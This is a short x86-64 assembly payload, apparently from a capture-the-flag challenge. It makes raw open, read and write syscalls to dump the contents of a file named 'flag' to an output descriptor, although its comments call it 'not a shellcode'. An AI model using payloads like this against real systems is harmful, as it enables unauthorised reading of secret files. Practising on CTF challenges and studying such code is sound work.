; it' s not a shellcode
; it tries to open the flag file
; read its content into a buffer in stack
; writes to stdout the contents of buffer
xor    rsi,rsi
xor    rdx,rdx
mov    rdi,0x67616c66 ;flag
push   rdi
mov    rdi,rsp
add    rax,0x100 ;rax is low address of buffer
push   rax
push   rax
mov    rax,0x2
syscall		;open
mov    rdi,rax
xor    rax,rax
pop    rsi
mov    rdx,0x100
syscall		;read
mov    rax,0x1
mov    rdi,0x00	;output fd
pop    rsi
mov    rdx,0x30
syscall		;write
